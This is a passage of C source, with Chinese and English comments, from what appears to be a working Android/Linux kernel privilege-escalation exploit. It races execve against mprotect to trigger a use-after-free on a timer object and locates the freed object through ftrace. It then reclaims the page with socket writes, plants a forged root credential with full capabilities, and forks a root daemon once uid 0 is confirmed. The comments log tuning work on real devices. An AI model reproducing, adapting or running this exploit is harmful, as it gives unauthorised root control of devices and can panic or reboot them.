	 * raw==0 与 raw>0 但 captured==0 是**两种完全不同的失败**，日志必须能区分：
	 *   raw==0        → 环形缓冲里一条记录都没有 → kmem_cache_alloc 事件多半
	 *                   没被 enable（rss_stat trigger 没触发）或没产生记录；
	 *   raw>0 & captured==0 → 记录有，但 call_site / bytes_req 没匹配上。
	 * 以前两者都只显示 captured=0，下一轮失败时完全无从判断。
	 */
	if (s.bytes == 0)
		dprintf(STDOUT_FILENO,
			"[uaf] raw buffer EMPTY — 事件多半没被 enable（rss_stat trigger "
			"没触发），不是匹配问题\n");
	else if (s.out_n == 0)
		dprintf(STDOUT_FILENO,
			"[uaf] 有 %zu 字节记录但没匹配上（call_site/bytes_req 不符）\n",
			s.bytes);
	log_sync();
	*chosen = s.chosen;
	return (s.out_n > index && s.chosen) ? 0 : -1;
}

static int prepare_vmas(void)
{
	long page = 4096;
	int fd = (int)syscall(SYS_memfd_create, "v", MFD_CLOEXEC);
	void *base;
	if (fd < 0 || ftruncate(fd, page))
		return -1;
	g_vmalen = (size_t)NVMA * (size_t)page;
	base = mmap(NULL, g_vmalen, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (base == MAP_FAILED)
		return -1;
	for (int i = 0; i < NVMA; i++) {
		void *at = (char *)base + (size_t)i * (size_t)page;
		if (mmap(at, (size_t)page, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != at)
			return -1;
	}
	close(fd);
	g_vmas = base;
	return 0;
}

#define HELPER_STACK (1 << 20)

static int spawn_helper(int (*fn)(void *), void *arg)
{
	void *stack = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
			   MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
	int pid;
	if (stack == MAP_FAILED)
		return -1;
	pid = clone(fn, (char *)stack + HELPER_STACK, CLONE_VM | SIGCHLD, arg);
	return pid;
}

/*
 * mprotect 风暴的节流（~1 ms）。
 *
 * 为什么必须节流：locker_fn 对 195 MB / 50000 个 VMA 的区间做 PROT_NONE<->PROT_READ
 * 翻转，mprotect 拿的是 mmap_lock **写锁**。满速循环时它会在两次调用之间立刻
 * 重新抢锁 —— 而 Linux 的 mmap_lock 写锁**不保证公平**，正在等锁的 execve
 * 可能被无限饿死：
 *   - execve 拆 mm 需要 mmap_lock 写锁 -> 抢不到 -> 利用进程卡死；
 *   - 而它**持有** mm 引用，整机所有要拿 mmap_lock 的路径一起卡住
 *     -> 整机冻结 -> 看门狗重启。
 * 这正是 run 8 的形状：「96 秒无任何输出、dropbox 全空、之后被看门狗重启」
 * （userspace 崩溃必然留 dropbox 条目，所以那次不是 Java 崩溃）。
 *
 * 命中率不受影响：execve 只要求「正好有一次 mprotect 在飞行中」，
 * 而拆一个 195 MB 的 mm 要几十毫秒 —— 1 ms 一次的节流几乎不损失命中概率，
 * 却把写锁占用率降下来，让等锁的 execve 真的能拿到锁。
 */
#define LOCKER_MPROTECT_GAP_NS 1000000L

static int locker_fn(void *arg)
{
	int prot = PROT_NONE;
	(void)arg;
	while (!atomic_load_explicit(&g_go, memory_order_acquire)) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
		sched_yield();
	}
	atomic_fetch_add_explicit(&g_lockers, 1, memory_order_release);
	while (!atomic_load_explicit(&g_stop, memory_order_acquire)) {
		int rc;
		atomic_store_explicit(&g_in_mprotect, 1, memory_order_release);
		rc = mprotect(g_vmas, g_vmalen, prot);
		atomic_store_explicit(&g_in_mprotect, 0, memory_order_release);
		if (rc && atomic_exchange_explicit(&g_mprotect_reported, 1, memory_order_relaxed) == 0)
			dprintf(STDOUT_FILENO, "[locker] mprotect errno=%d\n", errno);
		prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
		{
			struct timespec gap = { .tv_sec = 0,
					       .tv_nsec = LOCKER_MPROTECT_GAP_NS };
			nanosleep(&gap, NULL);
		}
	}
	return 0;
}

static int killer_fn(void *arg)
{
	int tgid = (int)(intptr_t)arg;
	int old;
	while (!(old = atomic_load_explicit(&g_exec_tid, memory_order_acquire))) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
		sched_yield();
	}
	for (;;) {
		if (syscall(SYS_tgkill, tgid, old, 0) < 0 && errno == ESRCH)
			break;
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
	}
	syscall(SYS_tgkill, tgid, tgid, SIGKILL);
	dprintf(STDOUT_FILENO, "[killer] SIGKILL tgid=%d old=%d errno=%d\n",
		tgid, old, errno);
	return 0;
}

static void *exec_fn(void *arg)
{
	struct sigevent event;
	struct itimerspec spec;
	char *argv[] = { (char *)"uaf_plant", (char *)"--exec-ok", NULL };
	(void)arg;
	struct sigevent armed_event;
	memset(&event, 0, sizeof(event));
	event.sigev_notify = SIGEV_NONE;
	memset(&armed_event, 0, sizeof(armed_event));
	armed_event.sigev_notify = SIGEV_SIGNAL;
	armed_event.sigev_signo = SIGRTMIN;
	memset(&spec, 0, sizeof(spec));
	spec.it_value.tv_sec = 3600;
	if (pin_cpu(critical_cpu()))
		_exit(116);
	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 2) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(124);
		sched_yield();
	}
	timer_t armed;
	int made = 0;
	for (int i = 0; i < 2048; i++) {
		timer_t extra;
		if (timer_create(CLOCK_THREAD_CPUTIME_ID,
				 i == 1024 ? &armed_event : &event, &extra))
			_exit(120);
		if (i == 1024) {
			armed = extra;
			if (timer_settime(armed, 0, &spec, NULL))
				_exit(120);
		}
		made++;
	}
	if (made < 2048)
		_exit(120);
	atomic_store_explicit(&g_exec_tid, (int)syscall(SYS_gettid), memory_order_release);
	atomic_store_explicit(&ipc->phase, 3, memory_order_release);
	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 4) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(125);
		sched_yield();
	}
	atomic_store_explicit(&g_go, 1, memory_order_release);
	while (atomic_load_explicit(&g_in_mprotect, memory_order_acquire) == 0) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(123);
		sched_yield();
	}
	dprintf(STDOUT_FILENO, "[exec_body] begin tid=%ld\n", (long)syscall(SYS_gettid));
	execve("/proc/self/exe", argv, NULL);
	_exit(122);
}

static int child_race(void)
{
	pthread_t exec_thread;
	sigset_t block;
	int tgid = (int)getpid();
	sigemptyset(&block);
	sigaddset(&block, SIGRTMIN);
	sigprocmask(SIG_BLOCK, &block, NULL);
	if (prepare_vmas())
		_exit(110);
	dprintf(STDOUT_FILENO, "[race_child] vmas ready pid=%d\n", getpid());
	if (pin_cpu(race_cpu()))
		_exit(115);
	for (int i = 0; i < 3; i++) {
		int pid = spawn_helper(locker_fn, NULL);
		if (pid < 0)
			_exit(111);
		ipc->helpers[ipc->nhelpers++] = pid;
	}
	{
		int pid = spawn_helper(killer_fn, (void *)(intptr_t)tgid);
		if (pid < 0)
			_exit(112);
		ipc->helpers[ipc->nhelpers++] = pid;
	}
	if (pthread_create(&exec_thread, NULL, exec_fn, NULL))
		_exit(114);
	atomic_store_explicit(&ipc->phase, 1, memory_order_release);
	for (;;)
		pause();
}

static int wait_phase(int want)
{
	for (int i = 0; i < 600; i++) {
		struct timespec pause = { .tv_nsec = 50000000 };
		if (atomic_load_explicit(&ipc->phase, memory_order_acquire) >= want)
			return 0;
		nanosleep(&pause, NULL);
	}
	return -1;
}

static void stop_helpers(void)
{
	if (!ipc)
		return;
	for (int i = 0; i < ipc->nhelpers && i < 4; i++) {
		if (ipc->helpers[i] > 0)
			kill(ipc->helpers[i], SIGKILL);
	}
}
static int wait_zombie(pid_t child, int *status_out)
{
	for (int i = 0; i < 400; i++) {
		siginfo_t info;
		struct timespec pause = { .tv_nsec = 50000000 };
		memset(&info, 0, sizeof(info));
		if (waitid(P_PID, (id_t)child, &info, WEXITED | WNOHANG | WNOWAIT))
			return -1;
		if (info.si_pid == child) {
			*status_out = info.si_status;
			return info.si_code;
		}
		nanosleep(&pause, NULL);
	}
	return 0;
}

/* E3 附带清理：原 raw_has_ptr() 没有调用点（死代码），且每 CPU malloc 8MB
 * 逐次全量读 raw，是本文件最重的重复 I/O 来源。删除；若将来需要"某指针是否
 * 出现在 raw trace 中"，用 raw_buf() 复用缓冲重写即可（git 历史里保留原实现）。 */

#define MAX_CPU 16
#define PER_CPU_RINGS 512
static uint64_t g_cpu_ctx[MAX_CPU][PER_CPU_RINGS];
static int g_cpu_n[MAX_CPU];

static void destroy_rings(void)
{
	for (int cpu = 0; cpu < MAX_CPU; cpu++) {
		for (int i = 0; i < g_cpu_n[cpu]; i++)
			syscall(SYS_io_destroy, g_cpu_ctx[cpu][i]);
		g_cpu_n[cpu] = 0;
	}
	g_nrings = 0;
}

static unsigned long *g_hold;
static int g_nhold;

/* E1：io_setup 数量上下限（默认 70000 = 历史值；上限受 aio-max-nr 约束，
 * 打满即视为成功前置条件满足，不再无限重试）。 */
#define DRAIN_AIO_RINGS_DEF 70000
#define DRAIN_AIO_RINGS_MIN 256
#define DRAIN_AIO_RINGS_MAX 262144

static void free_aio_hold(void)
{
	for (int i = 0; i < g_nhold; i++)
		syscall(SYS_io_destroy, g_hold[i]);
	g_nhold = 0;
	free(g_hold);
	g_hold = NULL;
}

static int g_stream[4][2];
static int g_nstream;
static unsigned g_shift;
static uint64_t g_task;
static uint64_t g_cred_kva;
static int g_plant_cred;
static int g_wake[2] = { -1, -1 };
static int g_report[2] = { -1, -1 };
static pid_t g_cred_child_pid = -1;

static void close_stream(void)
{
	for (int i = 0; i < g_nstream; i++) {
		if (g_stream[i][0] >= 0)
			close(g_stream[i][0]);
		if (g_stream[i][1] >= 0)
			close(g_stream[i][1]);
		g_stream[i][0] = g_stream[i][1] = -1;
	}
	g_nstream = 0;
}

static int g_fast;

int pc98260_run_rootd(void);

/*
 * Forged-cred field offsets are profile-driven (blob v4, see the statics at
 * the top of this file and init_offsets()). That closes review item B4: a KMI
 * shift now only means regenerating the profile from the device's boot.img
 * (BTF gives the real struct cred layout), no C change is needed.
 */

/*
 * R1：从 reclaim_stream 抽出的「构造 8KB 灌入模式」。
 *
 * 两种形态（由 g_plant_cred 决定）：
 *   g_plant_cred=1  在 node_off 处摆一份伪造 cred，字段偏移用 CRED_OFF_*（见 B4）；
 *   g_plant_cred=0  以 24 字节步长铺 k_itimer 的 rb_node，让悬挂节点指向 target。
 * 返回 0 成功；-1 表示该页布局放不下（已打印原因）。
 */

/*
 * 铺页窗口半径（字节）：#6 收窄后只在 node_off ±SPAN 内写 target（见 else 分支）。
 * 太小 → 对 node_off 漂移容错差、命中率降；太大 → 又回到整页散弹、脏 cred 风险回升。
 * 真机可据此回调，默认 0x200（约把脏地址足迹缩到 ~1/8）。
 */
#define STREAM_TILE_SPAN 0x200u

static int build_stream_pattern(unsigned char *pat, unsigned node_off,
				uint64_t base, uint64_t target, uint64_t victim)
{
	if (g_plant_cred) {
		uint64_t page = g_page_offset + (base << 12);
		uint64_t node_kva = victim + KITIMER_NODE;
		unsigned blob = node_off >= 0x40 ? 0 : 0x1f00;
		uint64_t *cred;
		if (node_off + CRED_PLANT_SIZE > 8192 || blob + 32 > 8192 ||
		    page + node_off != node_kva) {
			dprintf(STDOUT_FILENO, "[cred] plant does not fit off=%#x\n",
				node_off);
			return -1;
		}
		if (!(node_off >= blob + 32 || blob >= node_off + CRED_PLANT_SIZE)) {
			dprintf(STDOUT_FILENO, "[cred] blob overlaps node\n");
			return -1;
		}
		cred = (uint64_t *)(pat + node_off);
		if (CRED_UID_OFF >= 8) {
			/* 6.6/6.12/6.18: usage 占 8 字节，uid@8，直接写这两个槽位 */
			cred[0] = node_kva;                     /* usage（非 0 防止提前释放） */
			cred[1] = 0;                            /* uid / gid */
			/*
			 * suid / sgid 也必须为 0（正规 root cred 的全部 uid* 都是 0）。
			 * 历史实现把这里写成内核指针 g_task+TASK_CRED，指望后续
			 * one_uaf(g_cred_kva+16) 定向补零覆盖掉它；但 ask_child 只校验
			 * uid/euid，不校验 suid，一旦那两次补零 miss（最多重试 3 次且不
			 * 判成败），suid/sgid 就残留成一个内核地址——按有符号读即负数，
			 * 正是「偶尔提权后 uid 为负并导致重启」的根因。直接摆 0，补零
			 * 只作冗余保险。
			 */
			cred[2] = 0;                            /* suid / sgid */
		} else {
			/*
			 * 5.15/6.1: usage 只有 4 字节、uid@4；写 8 字节会把 uid 打成
			 * node_kva 的高半部，16 处又是 sgid/euid —— 这两处都不能碰，
			 * 只写 usage，uid..fsgid 保持 memset 的 0。
			 */
			*(uint32_t *)(pat + node_off) = (uint32_t)node_kva;
		}
		*(uint64_t *)(pat + node_off + CRED_OFF_CAP_INH)  = FULLCAP;
		*(uint64_t *)(pat + node_off + CRED_OFF_CAP_PERM) = FULLCAP;
		*(uint64_t *)(pat + node_off + CRED_OFF_CAP_EFF)  = FULLCAP;
		*(uint64_t *)(pat + node_off + CRED_OFF_CAP_BSET) = FULLCAP;
		*(uint64_t *)(pat + node_off + CRED_OFF_CAP_AMB)  = FULLCAP;
		*(uint64_t *)(pat + node_off + CRED_OFF_SELINUX)  = page + blob;
		*(uint64_t *)(pat + node_off + CRED_OFF_ROOT_USER)= slide_addr(LINK_ROOT_USER);
		*(uint64_t *)(pat + node_off + CRED_OFF_USER_NS)  = slide_addr(LINK_USER_NS);
		*(uint64_t *)(pat + node_off + CRED_OFF_UCOUNTS)  = slide_addr(LINK_UCOUNTS);
		*(uint64_t *)(pat + node_off + CRED_OFF_GROUPS)   = slide_addr(LINK_GROUPS);
		dprintf(STDOUT_FILENO,
			"[cred] node=%#" PRIx64 " task+cred=%#" PRIx64 " off=%#x\n",
			node_kva, g_task + TASK_CRED, node_off);
	} else {
		/*
		 * 收窄铺页范围（#6 负数 uid 重启）：悬挂 k_itimer 真正解引用的只有
		 * node_off 处那一个 rb_node（node[2]=rb_left=target 是关键的一跳）。
		 * 历史实现把整页 8KB 每 24 字节都铺上 {0,0,target}，纯属冗余散弹；一旦
		 * 这页被 free 后又被 cred_jar 复用，struct cred.uid（偏移 8）就可能落在
		 * 某个 node[2] 槽上，继承一个内核地址 → system_server 读到负 userId，
		 * 陷入每分钟一次的崩溃循环（软重启清不掉，须完整内核重启）。
		 *
		 * 现在只在 node_off ±STREAM_TILE_SPAN 窗口内铺 target，窗口外保持 memset
		 * 的 0：保留对 node_off 轻微漂移的容错，同时把脏地址足迹缩小约一个量级。
		 */
		unsigned align = node_off % 24u;
		unsigned lo = node_off > STREAM_TILE_SPAN
				? node_off - STREAM_TILE_SPAN : 0u;
		unsigned hi = node_off + STREAM_TILE_SPAN;
		if (hi > 8192u)
			hi = 8192u;
		for (unsigned off = align; off + 24 <= 8192; off += 24) {
			uint64_t *node;
			if (off < lo || off >= hi)
				continue;
			node = (uint64_t *)(pat + off);
			node[0] = 0;
			node[1] = 0;
			node[2] = target;
		}
		dprintf(STDOUT_FILENO,
			"[stream_backfill] tile win=[%u,%u) off=%#x\n", lo, hi, node_off);
	}
	return 0;
}

/** R1：从 reclaim_stream 抽出的「开 4 对已放大缓冲的 socketpair」。 */
static int open_stream_pairs(int big)
{
	g_nstream = 0;
	for (int i = 0; i < 4; i++) {
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_stream[i]))
			break;
		setsockopt(g_stream[i][0], SOL_SOCKET, SO_SNDBUF, &big, sizeof(big));
		setsockopt(g_stream[i][1], SOL_SOCKET, SO_RCVBUF, &big, sizeof(big));
		fcntl(g_stream[i][0], F_SETFL, O_NONBLOCK);
		g_nstream++;
	}
	return g_nstream ? 0 : -1;
}

static int reclaim_stream(uint64_t victim, uint64_t target)
{
	uint64_t base = object_pfn(victim + KITIMER_NODE) & ~UINT64_C(1);
	unsigned node_off = (unsigned)((victim + KITIMER_NODE) & 0x1fff);
	unsigned char *pat;
	int big = 16 << 20, hit = 0, writes = 0, ncpu;
	struct timespec start, now;
	if (node_off + 24 > 8192)
		return -1;
	pat = mmap(NULL, 8192, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (pat == MAP_FAILED)
		return -1;
	memset(pat, 0, 8192);
	/* R1：模式构造已抽出为 build_stream_pattern */
	if (build_stream_pattern(pat, node_off, base, target, victim)) {
		munmap(pat, 8192);
		return -1;
	}
	/* R1：socketpair 建立已抽出为 open_stream_pairs */
	if (open_stream_pairs(big)) {
		munmap(pat, 8192);
		return -1;
	}
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[stream_backfill] pairs=%d node_base=%#" PRIx64 " off=%#x\n",
		g_nstream, base, node_off);
	if (write_trace_buf_kb(trace_buf_kb(MEMGUARD_BUF_KB_RECLAIM))) {
		close_stream();
		return -1;
	}
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	if (trace_off_on() || kick_rss()) {
		close_stream();
		/* 环形缓冲已经被抬到高位，这里必须还原，否则它会一直占着。 */
		restore_trace_state();
		return -1;
	}
	{
		struct timespec pause = { .tv_nsec = 200000000 };
		int freed = 0;
		int waitn = g_fast ? 12 : 40;
		for (int i = 0; i < waitn && !freed; i++) {
			nanosleep(&pause, NULL);
			freed = trace_seen("mm_page_free:", base);
		}
		dprintf(STDOUT_FILENO, "[stream_backfill] page_freed=%d\n", freed);
	}
	clock_gettime(CLOCK_MONOTONIC, &start);
	int rounds = g_fast ? 10 : 6;
	for (int round = 0; round < rounds && !hit; round++) {
		int sends = g_fast ? 200 : 80;
		for (int i = 0, sock = 0; i < sends && !hit; i++) {
			ssize_t n;
			pin_cpu(i % ncpu);
			n = write(g_stream[sock][0], pat, 8192);
			if (n == 8192)
				writes++;
			else if (++sock >= g_nstream)
				break;
		}
		hit = trace_seen("mm_page_alloc:", base);
		clock_gettime(CLOCK_MONOTONIC, &now);
		if (now.tv_sec - start.tv_sec > 8)
			break;
	}
	write_file(TRACE "/tracing_on", "0\n");
	if (hit)
		dprintf(STDOUT_FILENO, "[stream_backfill] hit pfn=%#" PRIx64 "\n", base);
	dprintf(STDOUT_FILENO, "[stream_backfill] writes=%d hit=%d\n", writes, hit);
	quiet_reclaim_trace();
	munmap(pat, 8192);
	if (!hit)
		close_stream();
	return hit ? 0 : -1;
}

static int one_uaf(uint64_t target)
{
	struct timespec c0, c1;
	long cms;
	clock_gettime(CLOCK_MONOTONIC, &c0);
	pid_t child;
	int code, status = 0;
	int nptr;
	uint64_t victim;
	atomic_store_explicit(&g_go, 0, memory_order_relaxed);
	atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
	atomic_store_explicit(&g_lockers, 0, memory_order_relaxed);
	atomic_store_explicit(&g_exec_tid, 0, memory_order_relaxed);
	atomic_store_explicit(&ipc->phase, 0, memory_order_relaxed);
	ipc->nhelpers = 0;
	child = fork();
	if (child < 0)
		return -1;
	if (child == 0) {
		if (g_wake[0] >= 0)
			close(g_wake[0]);
		if (g_wake[1] >= 0)
			close(g_wake[1]);
		if (g_report[0] >= 0)
			close(g_report[0]);
		if (g_report[1] >= 0)
			close(g_report[1]);
		child_race();
	}
	if (wait_phase(1)) {
		dprintf(STDOUT_FILENO, "[uaf] child never readied phase=%d\n",
			atomic_load_explicit(&ipc->phase, memory_order_acquire));
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		restore_trace_state();
		return -1;
	}
	if (write_trace_buf_kb(trace_buf_kb(MEMGUARD_BUF_KB_COLLECT)) ||
	    trace_off_on() ||
	    arm_kmem_cache_alloc()) {
		kill(child, SIGKILL);
		stop_helpers();
		restore_trace_state();
		return -1;
	}
	atomic_store_explicit(&ipc->phase, 2, memory_order_release);
	if (wait_phase(3)) {
		dprintf(STDOUT_FILENO, "[uaf] timer was not created\n");
		write_file(TRACE "/tracing_on", "0\n");
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		restore_trace_state();
		return -1;
	}
	write_file(TRACE "/tracing_on", "0\n");
	if (collect_nth(1024, &nptr, &victim)) {
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		restore_trace_state();
		return -1;
	}
	if (nptr < 1500) {
		dprintf(STDOUT_FILENO, "[uaf] too few timers\n");
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		restore_trace_state();
		return -1;
	}
	disarm_kmem_cache_alloc();
	atomic_store_explicit(&ipc->phase, 4, memory_order_release);
	if (g_plant_cred)
		g_cred_kva = victim + KITIMER_NODE;
	if (reclaim_stream(victim, target)) {
		clock_gettime(CLOCK_MONOTONIC, &c1); cms = (c1.tv_sec - c0.tv_sec) * 1000 + (c1.tv_nsec - c0.tv_nsec) / 1000000;
	dprintf(STDOUT_FILENO, "[cycle] ms=%ld result=page_miss fast=%d\n", cms, g_fast);
	dprintf(STDOUT_FILENO, "[uaf] page miss, retry\n");
	log_sync();
		stop_helpers();
		restore_trace_state();
		return -1;
	}
	close_socks();
	code = wait_zombie(child, &status);
	dprintf(STDOUT_FILENO, "[uaf] child=%d code=%d status=%d\n",
		child, code, status);
	if (waitpid(child, &status, 0) < 0) {
		restore_trace_state();
		return -1;
	}
	clock_gettime(CLOCK_MONOTONIC, &c1); cms = (c1.tv_sec - c0.tv_sec) * 1000 + (c1.tv_nsec - c0.tv_nsec) / 1000000;
	dprintf(STDOUT_FILENO, "[cycle] ms=%ld result=ok fast=%d\n", cms, g_fast);
	log_sync();
	dprintf(STDOUT_FILENO, "[uaf] reaped status=%d\n", status);
	destroy_rings();
	stop_helpers();
	if (!WIFSIGNALED(status) || WTERMSIG(status) != SIGKILL) {
		dprintf(STDOUT_FILENO, "[uaf] reap was not SIGKILL\n");
		restore_trace_state();
		return -1;
	}
	return 0;
}

static volatile int g_daemon_mode = 0;
/* rootd is forked exactly once, the first time the escalation is confirmed.
 * Guarding it matters: ask_child() re-enters this code on every poll, and a
 * second rootd would fight over the same socket path. */
static int g_rootd_forked = 0;

static void cred_child(void)
{
	sigset_t block;
	setpgid(0, 0);
	sigfillset(&block);
	sigprocmask(SIG_BLOCK, &block, NULL);
	if (g_wake[1] >= 0)
		close(g_wake[1]);
	if (g_report[0] >= 0)
		close(g_report[0]);
	g_wake[1] = g_report[0] = -1;
	dprintf(STDOUT_FILENO, "[child-cred] waiting pid=%d\n", getpid());
	/*
	 * Lock the whole address space. The forged cred lives in a reclaimed page
	 * that this process borrowed from the parent; without MCL_CURRENT the page
	 * can be reclaimed under us and the cred read back as the original uid
	 * (that is exactly the "[cred] installed" followed by "Uid: 2000" symptom).
	 * MCL_FUTURE keeps pages allocated later (fork, heap growth) locked too.
	 *
	 * ⚠️ 真机 2026-10-31 18:24 实测 `mlockall errno=12`（ENOMEM）—— **整个调用
	 * 失败，连 MCL_FUTURE 也没生效**，保护完全落空。这与「少数情况跑提权会卡死
	 * 然后设备重启」高度吻合（页被回收 → cred 变悬空指针 → kernel panic）。
	 *
	 * ENOMEM 的成因：MCL_CURRENT 要锁定**全部已映射页**，而这个子进程继承了
	 * 整个 Android 运行时的地址空间（libc / libc++ 的文本与数据，十几 MB），
	 * Android 上 RLIMIT_MEMLOCK 又很小（uid 2000 默认 8 MB 甚至更小）→ 超额。
	 *
	 * 三步走，把「至少 MCL_FUTURE 生效」变成必然：
	 *   1) 先抬 RLIMIT_MEMLOCK —— cred 子进程从 fork 起就带着伪造的 cred，
	 *      此时已经是 uid 0，setrlimit 应当能成功（失败也无妨，继续下一步）；
	 *   2) 再单独上 MCL_FUTURE —— 它只约束**未来**的分配，额度消耗极小，
	 *      几乎必成；
	 *   3) 最后叠加 MCL_CURRENT（best-effort）。第 2 步拿到的 MCL_FUTURE 在
	 *      第 3 步失败时**依然生效**，不会像原来那样一次失败全丢。
	 */
	{
		struct rlimit rl;
		if (getrlimit(RLIMIT_MEMLOCK, &rl) == 0) {
			dprintf(STDOUT_FILENO,
				"[child-cred] memlock limit cur=%llu max=%llu\n",
				(unsigned long long)rl.rlim_cur,
				(unsigned long long)rl.rlim_max);
			/*
			 * 软限抬到硬限**不需要任何特权**（只有抬过硬限才需要
			 * CAP_SYS_RESOURCE，而这里 uid 还是 2000，拿不到）。
			 * 硬限本身在 Android 上通常比软限宽裕得多。
			 */
			if (rl.rlim_cur != rl.rlim_max) {
				struct rlimit up = rl;
				up.rlim_cur = rl.rlim_max;
				if (setrlimit(RLIMIT_MEMLOCK, &up) != 0)
					dprintf(STDOUT_FILENO,
						"[child-cred] warn: setrlimit(MEMLOCK soft->hard) errno=%d\n",
						errno);
			}
		} else {
			dprintf(STDOUT_FILENO, "[child-cred] warn: getrlimit(MEMLOCK) errno=%d\n",
				errno);
		}
	}
	if (mlockall(MCL_FUTURE))
		dprintf(STDOUT_FILENO, "[child-cred] warn: mlockall(MCL_FUTURE) errno=%d\n",
			errno);
	if (mlockall(MCL_CURRENT | MCL_FUTURE))
		dprintf(STDOUT_FILENO,
			"[child-cred] warn: mlockall(MCL_CURRENT) errno=%d "
			"(MCL_FUTURE 仍然生效)\n", errno);
	else
		dprintf(STDOUT_FILENO, "[child-cred] mlockall ok (CURRENT|FUTURE)\n");
	for (;;) {
		unsigned uid, euid, gid, egid;
		unsigned char go;
		char msg[96];
		/* Blocking read, as in the reference implementation: the child stays
		 * asleep unless the parent actually talks to it, which keeps the page
		 * reclaim race undisturbed. A read failure means the parent closed the
		 * pipe, i.e. it retired after handing the pages over. */
		if (read(g_wake[0], &go, 1) != 1) {
			if (g_daemon_mode) {
				/*
				 * Detach and then do nothing at all -- this is the reference
				 * shape (PC uaf_plant.c:1471-1487).
				 *
				 * This task's ->cred points into the reclaimed page, and it is
				 * the only thing that must never stop running. It therefore
				 * must not execute anything else either: every syscall, fork or
				 * page fault it performs is one more chance for the kernel to
				 * touch a page that has since been reused. rootd runs in its
				 * own process (forked below), so after this point the only
				 * thing left here is pause().
				 */
				dprintf(STDOUT_FILENO,
					"[child-cred] daemon mode: holding pages\n");
				log_sync();
				setsid();
				close(STDIN_FILENO);
				close(STDOUT_FILENO);
				close(STDERR_FILENO);
				open("/dev/null", O_RDONLY);
				open("/dev/null", O_WRONLY);
				open("/dev/null", O_WRONLY);
				for (;;)
					pause();
			}
			/*
			 * 父进程没了（管道 EOF）。
			 *
			 * 这里**不能** continue：read 在已关闭的管道上立刻返回 0，
			 * continue 回去就是 100% CPU 的死循环 —— 一个核被吃满，设备
			 * 会被拖卡，watchdog 随后会重启它。反复重试就会攒下一堆。
			 *
			 * 也不能退出：退出等于把父进程钉着的那批页放掉，本进程手里
			 * 那份伪造 cred 随即变成悬空指针，踩上去就是 kernel panic
			 * （真机 2026-10-31 22:11 的教训）。所以正确姿势是「什么都不做」：
			 * 安静地停在这里，等着被重启带走。
			 */
			dprintf(STDOUT_FILENO,
				"[child-cred] parent gone, parking (no CPU burn)\n");
			log_sync();
			for (;;)
				pause();
		}
		if (go == 0xAA) {
			/* Daemon command: acknowledge, drop the pipes, and keep looping
			 * until the parent closes its ends. */
			dprintf(STDOUT_FILENO, "[child-cred] entering daemon mode\n");
			log_sync();
			const char *ack = "daemon\n";
			(void)write(g_report[1], ack, strlen(ack));
			close(g_wake[0]);
			close(g_report[1]);
			g_daemon_mode = 1;
			continue;
		}
		uid = getuid();
		euid = geteuid();
		gid = getgid();
		egid = getegid();
		snprintf(msg, sizeof(msg), "uid=%u euid=%u gid=%u egid=%u\n",
			 uid, euid, gid, egid);
		if (write(g_report[1], msg, strlen(msg)) < 0)
			dprintf(STDOUT_FILENO, "[child-cred] answer errno=%d\n", errno);
		dprintf(STDOUT_FILENO, "[child-cred] %s", msg);
		/*
		 * Root confirmed: hand rootd its own process (PC uaf_plant.c:1516-1525).
		 *
		 * Always fork here, --daemon-exit or not. The daemon branch above only
		 * parks; rootd has to be a separate task so that the task carrying the
		 * forged cred never runs anything beyond pause(). This fork happens
		 * while the parent is still alive, so rootd inherits the log file on
		 * fd 1 / fd 2 and the host can still see C98260_ROOTD_READY=1 even
		 * though the daemon redirects its own stdio to /dev/null.
		 *
		 * The forked rootd gets a *copy* of the cred from prepare_creds(), i.e.
		 * a real cred_jar object, so it can fork shells and exit normally.
		 */
		if (uid == 0 && euid == 0 && !g_rootd_forked) {
			pid_t rd = fork();
			if (rd == 0) {
				setpgid(0, 0);
				pc98260_run_rootd();
				_exit(0);
			}
			g_rootd_forked = 1;
			dprintf(STDOUT_FILENO, "[child-cred] rootd forked pid=%d\n", (int)rd);
		}
	}
}

static void log_proc_uid(pid_t pid)
{
	char path[64];
	char line[160];
	FILE *file;
	snprintf(path, sizeof(path), "/proc/%d/status", (int)pid);
	file = fopen(path, "r");
	if (!file)
		return;
	while (fgets(line, sizeof(line), file)) {
		if (!strncmp(line, "Uid:", 4) || !strncmp(line, "CapEff:", 7) ||
		    !strncmp(line, "State:", 6))
			dprintf(STDOUT_FILENO, "[cred] proc %s", line);
	}
	fclose(file);
}

static int ask_child(unsigned *uid, unsigned *euid)
{
	char buf[80];
	struct pollfd pfd;
	unsigned char go = 1;
	ssize_t n;
	if (kill(g_cred_child_pid, 0) != 0) {
		dprintf(STDOUT_FILENO, "[cred] child %d is dead errno=%d\n",
			g_cred_child_pid, errno);
		log_proc_uid(g_cred_child_pid);
		return -1;
	}
	fcntl(g_report[0], F_SETFL, O_NONBLOCK);
	while (read(g_report[0], buf, sizeof(buf)) > 0)
		;
	fcntl(g_report[0], F_SETFL, 0);
	if (write(g_wake[1], &go, 1) != 1) {
		dprintf(STDOUT_FILENO, "[cred] ask write errno=%d\n", errno);
		return -1;
	}
	pfd.fd = g_report[0];
	pfd.events = POLLIN;
	if (poll(&pfd, 1, 2000) <= 0) {
